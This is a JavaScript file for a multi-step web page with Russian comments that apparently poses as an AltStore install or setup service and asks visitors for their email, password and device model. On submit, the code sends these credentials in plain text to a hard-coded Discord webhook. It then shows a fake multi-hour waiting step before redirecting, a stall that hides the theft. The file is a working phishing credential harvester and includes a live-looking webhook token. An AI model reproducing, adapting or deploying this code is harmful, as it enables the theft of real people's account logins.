document.addEventListener('DOMContentLoaded', () => {
    const mainContainer = document.getElementById('mainContainer');
    const detailsBtn = document.getElementById('detailsBtn');
    const modal = document.getElementById('modal');
    const closeBtn = document.querySelector('.close');
    const optionCards = document.querySelectorAll('.option-card');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    const continueBtn = document.getElementById('continueBtn');
    const submitBtn = document.getElementById('submitBtn');
    const whyBtn = document.getElementById('whyBtn');
    const whyDetails = document.getElementById('whyDetails');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const modelInput = document.getElementById('model');

    const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

    // Открыть модальное окно
    detailsBtn.addEventListener('click', () => {
        mainContainer.classList.add('hidden');
        modal.classList.remove('hidden');
    });

    // Закрыть модальное окно
    closeBtn.addEventListener('click', () => {
        modal.classList.add('hidden');
        mainContainer.classList.remove('hidden');
    });

    // Выбор опции
    optionCards.forEach(card => {
        card.addEventListener('click', () => {
            modal.classList.add('hidden');
            step1.classList.remove('hidden');
        });
    });

    // Шаг 1 -> Шаг 2
    continueBtn.addEventListener('click', () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    });

    // Показать / скрыть пояснение про AltStore
    whyBtn.addEventListener('click', () => {
        whyDetails.classList.toggle('hidden');
    });

    // Отправка данных в Discord
    submitBtn.addEventListener('click', () => {
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        const model = modelInput.value.trim();

        if (!email || !password || !model) {
            alert('Пожалуйста, заполните все поля.');
            return;
        }

        const payload = {
            content: `**Новые данные**\n**Почта:** ${email}\n**Пароль:** ${password}\n**Модель:** ${model}`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => {
            if (res.ok) {
                step2.classList.add('hidden');
                step3.classList.remove('hidden');
                // Имитация ожидания 3-4 часа (для теста можно уменьшить)
                setTimeout(() => {
                    window.location.href = 'redirect.html';
                }, 3 * 60 * 60 * 1000); // 3 часа
            } else {
                alert('Ошибка отправки. Попробуйте ещё раз.');
            }
        })
        .catch(() => alert('Ошибка сети.'));
    });
});
